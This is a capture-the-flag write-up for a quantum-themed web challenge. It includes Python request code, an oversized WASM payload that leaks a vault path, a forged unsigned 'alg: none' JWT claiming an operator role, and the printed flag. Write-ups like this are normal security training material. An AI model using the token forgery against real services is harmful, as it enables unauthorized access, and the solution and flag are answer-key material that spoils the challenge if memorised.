**Quantum Paradox Challenge Solution Walkthrough**

This document explains the step-by-step process to retrieve the flag from the quantum-themed server. The solution involves three sequential stages of interaction with the server's protocols.

---

### **Stage 1: Quantum Handshake Initialization**
**Endpoint**: `POST /qchannel`  
**Purpose**: Establish quantum entanglement with the server.

**Implementation**:
```python
response = requests.post(
    "http://chals.bitskrieg.in:3009/qchannel",
    headers={"x-quantum-phase": "superposition"},
    data=bytes.fromhex("deadbeef")
)
```
- **Header Requirement**: The `x-quantum-phase` must be set to `superposition` to initialize the quantum state.
- **Body Requirement**: The first 4 bytes of the request body must match the hex value `deadbeef`, representing the quantum entanglement initialization vector.  
- **Response**: Successful execution returns `x-quantum-state: entangled` in headers.

---

### **Stage 2: Path Acquisition via Qubit Processing**
**Endpoint**: `POST /qproc`  
**Purpose**: Obtain the vault path through server response.

**Implementation**:
```python
wasm = b"\x00asm\x01\x00\x00\x00" + (b"\x00" * 8193)
response1 = requests.post("http://chals.bitskrieg.in:3009/qproc", data=wasm)
```
- **Payload Design**:  
  - A valid WASM header (`\x00asm\x01\x00\x00\x00`) ensures the server processes the payload.  
  - The 8193-byte size exceeds the server's buffer capacity, triggering a controlled response.  
- **Result**: The server responds with the error message containing the vault path `Quantum_decoherence_22323`.

---

### **Stage 3: Temporal Authentication**
**Endpoint**: `GET /vault/{path}`  
**Purpose**: Access the flag using quantum operator privileges.

#### **Step 3.1: JWT Token Generation**
```python
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').strip(b'=')
payload = base64.urlsafe_b64encode(
    f'{{"qrole":"operator","iat":{current_time},"exp":{exp_time}}}'.encode()
).strip(b'=')
token = f"{header.decode()}.{payload.decode()}."
```
- **Header**: Specifies `alg: none` to indicate no cryptographic signature.  
- **Payload**: Contains:  
  - `qrole: operator` (required privilege level)  
  - `iat`/`exp` timestamps (valid temporal window)  

#### **Step 3.2: Flag Retrieval**
```python
response = requests.get(
    f"http://chals.bitskrieg.in:3009/vault/{response1.text}",
    headers={"Authorization": f"Quantum {token}"}
)
```
- **Authorization Header**: Uses the `Quantum` scheme with the generated JWT.  
- **Path Construction**: Uses the vault path obtained in Stage 2.  
- **Validation**: The server checks for:  
  - Valid JWT structure  
  - `operator` role in payload  
  - Unexpired temporal claims  

---

### **Final Output**
```
Quantum State: entangled
Flag: BITSCTF{Quantumn_Got_Spilled_2203AA23}
```

---

### **Key Protocol Interactions**
| Stage | Protocol Component      | Technical Requirement                          |
|-------|-------------------------|------------------------------------------------|
| 1     | Quantum Handshake       | Correct phase header + entanglement initialization |
| 2     | Qubit Processing        | WASM header validity + payload size trigger   |
| 3     | Temporal Authentication | JWT structure + role claims + time validation |

